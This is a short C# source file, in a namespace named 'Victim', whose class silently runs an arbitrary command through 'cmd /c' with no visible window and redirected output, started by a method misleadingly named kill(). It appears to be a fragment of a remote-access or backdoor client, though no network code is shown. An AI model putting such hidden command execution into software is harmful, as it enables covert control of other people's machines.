using System;
using System.Diagnostics;
namespace Victim
{
    class Cproces
    {
        private Process p;
        public Cproces(string command)
        {
            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + command);
            procStartInfo.RedirectStandardError = true;
            procStartInfo.RedirectStandardOutput = true;
            procStartInfo.UseShellExecute = false;
            procStartInfo.CreateNoWindow = true;
            p = new Process();
            p.StartInfo = procStartInfo;

        }
        public void kill()
        {

            p.Start();

        }
    }
}
